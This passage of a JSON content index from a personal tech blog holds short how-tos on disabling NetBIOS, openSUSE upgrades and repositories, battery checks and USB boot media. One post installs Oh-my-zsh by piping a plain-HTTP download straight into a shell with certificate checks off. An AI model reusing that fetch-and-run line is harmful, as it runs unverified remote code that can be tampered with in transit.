system","slug":"security/operating-system","permalink":"http://rawsec.ml/categories/security/operating-system/"},{"name":"centos","slug":"security/operating-system/centos","permalink":"http://rawsec.ml/categories/security/operating-system/centos/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/tags/linux/"},{"name":"centos","slug":"centos","permalink":"http://rawsec.ml/tags/centos/"},{"name":"ssh","slug":"ssh","permalink":"http://rawsec.ml/tags/ssh/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"operating system","slug":"security/operating-system","permalink":"http://rawsec.ml/categories/security/operating-system/"},{"name":"centos","slug":"security/operating-system/centos","permalink":"http://rawsec.ml/categories/security/operating-system/centos/"}]},{"title":"Disable NetBIOS  via Windows register","slug":"disable-netbios-via-windows-register","date":"2015-12-19T23:00:00.000Z","updated":"2016-10-12T21:07:54.525Z","comments":true,"path":"en/disable-netbios-via-windows-register/","link":"","permalink":"http://rawsec.ml/en/disable-netbios-via-windows-register/","excerpt":"","text":"NetBIOS is a very old protocol wich is no more interesting today except in some particular cases. To disable it with the Windows register there are only a few steps : Launch the register editor (regedit.exe) Go to HKLM\\SYSTEM\\CurrentControlSet\\services\\NetBT\\Parameters\\Interfaces Select each interface Each interface wich have a paramater NetbiosOptions put to 0 or 1 must be change to 2 and then clic OK Close the register editor The parameter SetTcpipNetbios can have these value : 0 – Use NetBIOS parameters from DHCP server 1 – Enable NetBIOS via TCP/IP 2 – Disable NetBIOS via TCP/IP","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"operating system","slug":"security/operating-system","permalink":"http://rawsec.ml/categories/security/operating-system/"},{"name":"windows","slug":"security/operating-system/windows","permalink":"http://rawsec.ml/categories/security/operating-system/windows/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"windows","slug":"windows","permalink":"http://rawsec.ml/tags/windows/"},{"name":"netbios","slug":"netbios","permalink":"http://rawsec.ml/tags/netbios/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"operating system","slug":"security/operating-system","permalink":"http://rawsec.ml/categories/security/operating-system/"},{"name":"windows","slug":"security/operating-system/windows","permalink":"http://rawsec.ml/categories/security/operating-system/windows/"}]},{"title":"Disable NetBIOS in CLI with WMIC","slug":"disable-netbios-cli-wmic","date":"2015-12-19T23:00:00.000Z","updated":"2016-10-12T21:07:54.482Z","comments":true,"path":"en/disable-netbios-cli-wmic/","link":"","permalink":"http://rawsec.ml/en/disable-netbios-cli-wmic/","excerpt":"","text":"NetBIOS is a very old protocol wich is no more interesting today except in some particular cases. But it has a large number of security flaws. We can use WMIC (Microsoft Windows Management Instrumentation Command-line) to disable it. Before disabling it we will see wich network interfaces are using it: With cmd.exe: 1bat wmic nicconfig get caption,index,TcpipNetbiosOptions With PowerShell: 1wmic nicconfig get &quot;caption,index,TcpipNetbiosOptions&quot; Then you will need administrator power to run the following commands: If you want to disable NetBIOS for one network interface only, identify it index number and run: 1wmic nicconfig where index=5 call SetTcpipNetbios 2 If you want to disable NetBIOS for all network interfaces run: 12wmic nicconfig where TcpipNetbiosOptions=0 call SetTcpipNetbios 2wmic nicconfig where TcpipNetbiosOptions=1 call SetTcpipNetbios 2 SetTcpipNetbios can take this values: 0 – Use NetBIOS parameters from DHCP server 1 – Enable NetBIOS via TCP/IP 2 - Disable NetBIOS via TCP/IP","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"operating system","slug":"security/operating-system","permalink":"http://rawsec.ml/categories/security/operating-system/"},{"name":"windows","slug":"security/operating-system/windows","permalink":"http://rawsec.ml/categories/security/operating-system/windows/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"windows","slug":"windows","permalink":"http://rawsec.ml/tags/windows/"},{"name":"netbios","slug":"netbios","permalink":"http://rawsec.ml/tags/netbios/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"operating system","slug":"security/operating-system","permalink":"http://rawsec.ml/categories/security/operating-system/"},{"name":"windows","slug":"security/operating-system/windows","permalink":"http://rawsec.ml/categories/security/operating-system/windows/"}]},{"title":"Qwant Lite : a refined version","slug":"qwant-line-refined-version","date":"2015-10-04T22:00:00.000Z","updated":"2016-10-12T21:07:54.532Z","comments":true,"path":"en/qwant-line-refined-version/","link":"","permalink":"http://rawsec.ml/en/qwant-line-refined-version/","excerpt":"","text":"The lite version of Qwant is avaible here. It’ a version without JavaScript and without CSS3 so it’s more retro-compatible as possible.","categories":[{"name":"news","slug":"news","permalink":"http://rawsec.ml/categories/news/"}],"tags":[{"name":"news","slug":"news","permalink":"http://rawsec.ml/tags/news/"}],"keywords":[{"name":"news","slug":"news","permalink":"http://rawsec.ml/categories/news/"}]},{"title":"How to change of terminal in command-line with Linux","slug":"change-terminal-command-line","date":"2015-09-17T22:00:00.000Z","updated":"2016-10-12T21:07:54.492Z","comments":true,"path":"en/change-terminal-command-line/","link":"","permalink":"http://rawsec.ml/en/change-terminal-command-line/","excerpt":"","text":"Changing of TTY (TeleTYpewriter), text console or text terminal without keyboard shortcut may be useful for remote administration or virtualization.So to change of TTY in CLI (Command-Line Interface) you need root power:1chvt N where N is the terminal number. And if you want to know witch terminal you are using you can use:1fgconsole","categories":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/tags/linux/"},{"name":"system","slug":"system","permalink":"http://rawsec.ml/tags/system/"}],"keywords":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"}]},{"title":"Migrate from openSUSE 13.1 to openSUSE 13.2","slug":"migrate-from-opensuse-13-1-to-opensuse-13-2","date":"2014-11-19T23:00:00.000Z","updated":"2016-10-12T21:07:54.515Z","comments":true,"path":"en/migrate-from-opensuse-13-1-to-opensuse-13-2/","link":"","permalink":"http://rawsec.ml/en/migrate-from-opensuse-13-1-to-opensuse-13-2/","excerpt":"","text":"Check that update repository is existing and activated, so display repository list with URLs display: zypper repos --uri. Check you have this repository: 123# | Alias | Name | Enabled | Refresh | URI---+-----------------+-----------------+---------+---------+---------------------------------------1 | repo-update | repo-update | Yes | Yes | http://download.opensuse.org/update/13.1/ If it is not enabled, activate it: zypper modifyrepo --enable repo-update. If it is not existing, add it: zypper addrepo --check --refresh --name &#39;openSUSE-13.1-Update&#39; http://download.opensuse.org/update/13.1/ repo-update Refresh and update repositories: zypper refresh and zypper update. Check the repository list: zypper lr. We’ll need to remove all unofficial repositories one by one: zypper rr alias. Save old repositories and put new ones: 12cp -Rv /etc/zypp/repos.d /etc/zypp/repos.d.Oldsed -i &apos;s/13\\.1/13.2/g&apos; /etc/zypp/repos.d/* Refresh repositories again: zypper refresh. Prefer tty1 (foreground virtual terminal) over X Session for the upgrade (CTRL+ALT+F1 or sudo chvt 1). During the upgrade DO NOT shutdown and DON’T interrupt Internet connexion or you can broke your system. Start the distribution upgrade: zypper dup Source: openSUSE.org","categories":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"},{"name":"opensuse","slug":"linux/opensuse","permalink":"http://rawsec.ml/categories/linux/opensuse/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/tags/linux/"},{"name":"opensuse","slug":"opensuse","permalink":"http://rawsec.ml/tags/opensuse/"}],"keywords":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"},{"name":"opensuse","slug":"linux/opensuse","permalink":"http://rawsec.ml/categories/linux/opensuse/"}]},{"title":"Install Oh-my-zsh on openSUSE","slug":"install-oh-my-zsh-opensuse","date":"2014-10-23T22:00:00.000Z","updated":"2016-10-12T21:07:54.482Z","comments":true,"path":"en/install-oh-my-zsh-opensuse/","link":"","permalink":"http://rawsec.ml/en/install-oh-my-zsh-opensuse/","excerpt":"","text":"Install zsh zypper in zsh and git zypper in git. Then install oh-my-zsh wget --no-check-certificate http://install.ohmyz.sh -O - | sh. Then define zsh as your default shell: chsh -s /bin/zsh.","categories":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"},{"name":"opensuse","slug":"linux/opensuse","permalink":"http://rawsec.ml/categories/linux/opensuse/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/tags/linux/"},{"name":"opensuse","slug":"opensuse","permalink":"http://rawsec.ml/tags/opensuse/"}],"keywords":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"},{"name":"opensuse","slug":"linux/opensuse","permalink":"http://rawsec.ml/categories/linux/opensuse/"}]},{"title":"Learn Linux: Help","slug":"learn-linux-help","date":"2014-09-06T22:00:00.000Z","updated":"2016-10-12T21:07:54.482Z","comments":true,"path":"en/learn-linux-help/","link":"","permalink":"http://rawsec.ml/en/learn-linux-help/","excerpt":"","text":"What is the man? Let’s see what it says itself:1234$ man -f manman (1) - an interface to the on-line reference manualsman (7) - macros to format man pagesman (1p) - display system documentation Command Description man Explanation manual for commands and files man -f or whatis Short description for a command man -k or apropos Commands list containing the argument keyword Examples:1234567891011$ man -f unzipunzip (1) - list, test and extract compressed files in a ZIP archive$ man -k unzipbunzip2 (1) - a block-sorting file compressor, v1.0.6funzip (1) - filter for extracting from a ZIP archive in a pipegunzip (1) - compress or expand fileshunzip (1) - decompress and decrypt hzip files to the standard outputmtx-unzip (1) - (sujet inconnu)unzip (1) - list, test and extract compressed files in a ZIP archiveunzipsfx (1) - self-extracting stub for prepending to ZIP archives","categories":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/tags/linux/"}],"keywords":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"}]},{"title":"Display repository list in comand-line on openSUSE","slug":"display-repository-list-comand-line-openSUSE","date":"2014-08-02T22:00:00.000Z","updated":"2016-10-12T21:07:54.532Z","comments":true,"path":"en/display-repository-list-comand-line-openSUSE/","link":"","permalink":"http://rawsec.ml/en/display-repository-list-comand-line-openSUSE/","excerpt":"","text":"To display the repository list in command line you can use : 123456789101112131415161718zypper lr# | Alias | Name | Enabled | GPG Check | Refresh---+---------------------------+--------------------------------------------+---------+-----------+-------- 1 | Bumblebee | Bumblebee | No | ---- | Yes 2 | Java_packages | Factory Java packages (openSUSE_Leap_42.1) | Yes | (r ) Yes | No 3 | Nvidia | Nvidia | No | ---- | Yes 4 | devel_languages_python | Python Modules (openSUSE_Leap_42.1) | Yes | (r ) Yes | No 5 | local_RPMs | local RPMs | Yes | ( p) Yes | Yes 6 | packman | packman | Yes | (r ) Yes | Yes 7 | repo-debug | openSUSE-Leap-42.1-Debug | No | ---- | Yes 8 | repo-debug-non-oss | openSUSE-Leap-42.1-Debug-Non-Oss | No | ---- | Yes 9 | repo-debug-update | openSUSE-Leap-42.1-Update-Debug | No | ---- | Yes 10 | repo-debug-update-non-oss | openSUSE-Leap-42.1-Update-Debug-Non-Oss | No | ---- | Yes 11 | repo-non-oss | openSUSE-Leap-42.1-Non-Oss | Yes | (r ) Yes | Yes 12 | repo-oss | openSUSE-Leap-42.1-Oss | Yes | (r ) Yes | Yes 13 | repo-source | openSUSE-Leap-42.1-Source | No | ---- | Yes 14 | repo-update | openSUSE-Leap-42.1-Update | Yes | (r ) Yes | Yes 15 | repo-update-non-oss | openSUSE-Leap-42.1-Update-Non-Oss | Yes | (r ) Yes | Yes Or for more details:123456789101112131415161718zypper lr -d# | Alias | Name | Enabled | GPG Check | Refresh | Priority | Type | URI | Service---+---------------------------+--------------------------------------------+---------+-----------+---------+----------+----------+----------------------------------------------------------------------------------------+-------- 1 | Bumblebee | Bumblebee | No | ---- | Yes | 99 | rpm-md | http://download.opensuse.org/repositories/X11:/Bumblebee/openSUSE_Leap_42.1/ | 2 | Java_packages | Factory Java packages (openSUSE_Leap_42.1) | Yes | (r ) Yes | No | 99 | rpm-md | http://download.opensuse.org/repositories/Java:/packages/openSUSE_Leap_42.1/ | 3 | Nvidia | Nvidia | No | ---- | Yes | 99 | rpm-md | ftp://download.nvidia.com/opensuse/leap/42.1/ | 4 | devel_languages_python | Python Modules (openSUSE_Leap_42.1) | Yes | (r ) Yes | No | 98 | rpm-md | http://download.opensuse.org/repositories/devel:/languages:/python/openSUSE_Leap_42.1/ | 5 | local_RPMs | local RPMs | Yes | ( p) Yes | Yes | 99 | plaindir | dir:///home/shark/localRMPS | 6 | packman | packman | Yes | (r ) Yes | Yes | 99 | rpm-md | http://ftp.gwdg.de/pub/linux/misc/packman/suse/openSUSE_Leap_42.1/ | 7 | repo-debug | openSUSE-Leap-42.1-Debug | No | ---- | Yes | 99 | NONE | http://download.opensuse.org/debug/distribution/leap/42.1/repo/oss/ | 8 | repo-debug-non-oss | openSUSE-Leap-42.1-Debug-Non-Oss | No | ---- | Yes | 99 | NONE | http://download.opensuse.org/debug/distribution/leap/42.1/repo/non-oss/ | 9 | repo-debug-update | openSUSE-Leap-42.1-Update-Debug | No | ---- | Yes | 99 | NONE | http://download.opensuse.org/debug/update/leap/42.1/oss | 10 | repo-debug-update-non-oss | openSUSE-Leap-42.1-Update-Debug-Non-Oss | No | ---- | Yes | 99 | NONE | http://download.opensuse.org/debug/update/leap/42.1/non-oss/ | 11 | repo-non-oss | openSUSE-Leap-42.1-Non-Oss | Yes | (r ) Yes | Yes | 99 | yast2 | http://download.opensuse.org/distribution/leap/42.1/repo/non-oss/ | 12 | repo-oss | openSUSE-Leap-42.1-Oss | Yes | (r ) Yes | Yes | 99 | yast2 | http://download.opensuse.org/distribution/leap/42.1/repo/oss/ | 13 | repo-source | openSUSE-Leap-42.1-Source | No | ---- | Yes | 99 | NONE | http://download.opensuse.org/source/distribution/leap/42.1/repo/oss/ | 14 | repo-update | openSUSE-Leap-42.1-Update | Yes | (r ) Yes | Yes | 99 | rpm-md | http://download.opensuse.org/update/leap/42.1/oss/ | 15 | repo-update-non-oss | openSUSE-Leap-42.1-Update-Non-Oss | Yes | (r ) Yes | Yes | 99 | rpm-md | http://download.opensuse.org/update/leap/42.1/non-oss/ | To export/save your repository list:1sudo zypper repos -e myreposbackup.repo","categories":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"},{"name":"opensuse","slug":"linux/opensuse","permalink":"http://rawsec.ml/categories/linux/opensuse/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/tags/linux/"},{"name":"system","slug":"system","permalink":"http://rawsec.ml/tags/system/"},{"name":"opensuse","slug":"opensuse","permalink":"http://rawsec.ml/tags/opensuse/"}],"keywords":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"},{"name":"opensuse","slug":"linux/opensuse","permalink":"http://rawsec.ml/categories/linux/opensuse/"}]},{"title":"Know status and health battery in command-line","slug":"know-status-health-battery-command-line","date":"2014-08-02T22:00:00.000Z","updated":"2016-10-12T21:07:54.518Z","comments":true,"path":"en/know-status-health-battery-command-line/","link":"","permalink":"http://rawsec.ml/en/know-status-health-battery-command-line/","excerpt":"","text":"To see your battery infos you can use acpi if you have it or directly see system files. Upower commandIn both case you can use upower command to get some usefull infos: 1upower -i /org/freedesktop/UPower/devices/battery_BAT0 Example output: 12345678910111213141516171819202122native-path: BAT0vendor: ASUSTeKmodel: N56--52power supply: yesupdated: ven. 01 avril 2016 08:58:27 CEST (99 seconds ago)has history: yeshas statistics: yesbattery present: yes rechargeable: yes state: fully-charged warning-level: none energy: 41,162 Wh energy-empty: 0 Wh energy-full: 43,054 Wh energy-full-design: 57,2 Wh energy-rate: 0 W voltage: 12,377 V percentage: 95% capacity: 75,2692% technology: lithium-ion icon-name: &apos;battery-full-charged-symbolic&apos; With acpiMany distributions don’t use it so if you want to install it you can do: 1sudo zypper in acpi OR 1sudo yum install acpi &amp;&amp; sudo yum install acpitool OR 1sudo apt-get install acpi &amp;&amp; sudo apt-get install acpitool To check is you have it installed: 1acpi -V You can see battery health:1cat /proc/acpi/battery/BAT0/info and the battery status:1cat /proc/acpi/battery/BAT0/state OR 1acpi You can also display ac adpter information:1acpi -a You can show thermal information:1acpi -t OR 1cat /proc/acpi/thermal_zone/THM/temperature Without acpiWithout acpi you will need to browse /sys/class/power_supply/BAT0 directory and display files that are inside.","categories":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/tags/linux/"},{"name":"system","slug":"system","permalink":"http://rawsec.ml/tags/system/"},{"name":"opensuse","slug":"opensuse","permalink":"http://rawsec.ml/tags/opensuse/"}],"keywords":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"}]},{"title":"Reach the command line interface (text mode) at boot time","slug":"reach-command-line-interface-text-mode-boot-time","date":"2014-08-02T22:00:00.000Z","updated":"2016-10-12T21:07:54.538Z","comments":true,"path":"en/reach-command-line-interface-text-mode-boot-time/","link":"","permalink":"http://rawsec.ml/en/reach-command-line-interface-text-mode-boot-time/","excerpt":"","text":"This work with Grub2: When you are on the bootloader, hover over your distribution name and press e (e for edit) You can now add options in the window that just opened On the line beginning with linux, add 3 at the end of the line (with a space) Press F10 to start PS : This modification is temporary, next start up openSUSE will boot normaly.:x","categories":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"},{"name":"opensuse","slug":"linux/opensuse","permalink":"http://rawsec.ml/categories/linux/opensuse/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/tags/linux/"},{"name":"system","slug":"system","permalink":"http://rawsec.ml/tags/system/"},{"name":"opensuse","slug":"opensuse","permalink":"http://rawsec.ml/tags/opensuse/"}],"keywords":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"},{"name":"opensuse","slug":"linux/opensuse","permalink":"http://rawsec.ml/categories/linux/opensuse/"}]},{"title":"DISPLAYMANAGER and WINDOWSMANAGER","slug":"opensuse-displaymanager-windowsmanager","date":"2014-08-02T22:00:00.000Z","updated":"2016-10-12T21:07:54.505Z","comments":true,"path":"en/opensuse-displaymanager-windowsmanager/","link":"","permalink":"http://rawsec.ml/en/opensuse-displaymanager-windowsmanager/","excerpt":"","text":"Change of Display ManagerPass root1sudo -i Then open /etc/sysconfig/displaymanager with a text editor.1vim /etc/sysconfig/displaymanager Display Manager can be changed at line DISPLAYMANAGER=&quot;XXX&quot; Display Manager also called Login Manager can be modified as explained previously. Main managers are: LightDM for Unity GDM for GNOME KDM for KDE XDM for X Window Entrance for Enlightenment For more manager, see here. If you have trouble with a manager you can temporarily replace it with xdm : DISPLAYMANAGER=&quot;xdm&quot;. Change of Window ManagerTo change of window manager laso called desktop manager, open /etc/sysconfig/windowmanager.1vim /etc/sysconfig/windowmanager At line DEFAULT_WM=&quot;XXX&quot;,replace XXX with one of these manager : gnome, kde, xfce, lxde, enlightenment, icewm, cinnamon.For example DEFAULT_WM=&quot;xfce&quot;. The a reboot it’s needed.","categories":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"},{"name":"opensuse","slug":"linux/opensuse","permalink":"http://rawsec.ml/categories/linux/opensuse/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/tags/linux/"},{"name":"opensuse","slug":"opensuse","permalink":"http://rawsec.ml/tags/opensuse/"}],"keywords":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"},{"name":"opensuse","slug":"linux/opensuse","permalink":"http://rawsec.ml/categories/linux/opensuse/"}]},{"title":"How to know the graphic controller under Linux","slug":"know-graphic-controller-linux","date":"2014-08-02T22:00:00.000Z","updated":"2016-10-12T21:07:54.515Z","comments":true,"path":"en/know-graphic-controller-linux/","link":"","permalink":"http://rawsec.ml/en/know-graphic-controller-linux/","excerpt":"","text":"To know your 3D graphic(s) controller(s) working (GPU or/and chipset) with your VGA output you can run the following command : 1/sbin/lspci | egrep 'VGA|3D' Example : 123/sbin/lspci | egrep 'VGA|3D'00:02.0 VGA compatible controller: Intel Corporation 3rd Gen Core processor Graphics Controller (rev 09)01:00.0 VGA compatible controller: NVIDIA Corporation GF108M [GeForce GT 630M] (rev a1)","categories":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/tags/linux/"},{"name":"system","slug":"system","permalink":"http://rawsec.ml/tags/system/"},{"name":"graphic","slug":"graphic","permalink":"http://rawsec.ml/tags/graphic/"}],"keywords":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"}]},{"title":"How to make a bootable USB stick to install Ubuntu","slug":"install-ubuntu-from-usb-stick","date":"2012-12-17T23:00:00.000Z","updated":"2016-03-09T23:00:00.000Z","comments":true,"path":"en/install-ubuntu-from-usb-stick/","link":"","permalink":"http://rawsec.ml/en/install-ubuntu-from-usb-stick/","excerpt":"","text":"This tutorial was thinked for Windows users who want to install an easy to use Linux distibution. Before installing a Linux distribution, it's highly recommended to save all your datas. It is highly recommended to perform a defragmentation before the install in order to avoid data loss. Step n°1 : Download the last Ubuntu versionYou can donwload the Ubuntu Desktop iso on the official website. Step n°2 : Download the last version of Linux Live USB CreatorYou can find Linux Live USB Creator on the official website. Then just install it. Step n°3 : Get the USB stick readyLaunch Linux Live USB Creator. Choose the USB stick where you will install Ubuntu. Choose the iso you have just downloaded in the Source tab. Let the persistence to 0. Check the option Format the stick. Clic on the lightning icon to launch the installation. Step n°4 : BootWhen the USB stick is ready, insert (plug) it in a usb port and restart your computer. To access to the Boot menu of your computer see the informations at boot time and press the right key or try the more common keys Escape or F12. For older materials you may not be able to boot with USB so you will have to burn a live CD or DVD. In the Boot menu, choose your USB stick. A menu appear, choose Installation to directly install Ubuntu or Try Ubuntu to try it before installing. If you choosed Try Ubuntu you arrived on the desktop screen : You can try Ubuntu and install it when you are ready. Step n°5 : InstallationThis article was only about preparing the USB stick but you can find lots of tutorial on How to install Ubuntu on the web. You may find more info or method about creating bootable USB devices [here](https://help.ubuntu.com/community/Installation/FromUSBStick ).","categories":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"},{"name":"ubuntu","slug":"linux/ubuntu","permalink":"http://rawsec.ml/categories/linux/ubuntu/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/tags/linux/"},{"name":"ubuntu","slug":"ubuntu","permalink":"http://rawsec.ml/tags/ubuntu/"},{"name":"install","slug":"install","permalink":"http://rawsec.ml/tags/install/"}],"keywords":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"},{"name":"ubuntu","slug":"linux/ubuntu","permalink":"http://rawsec.ml/categories/linux/ubuntu/"}]}]}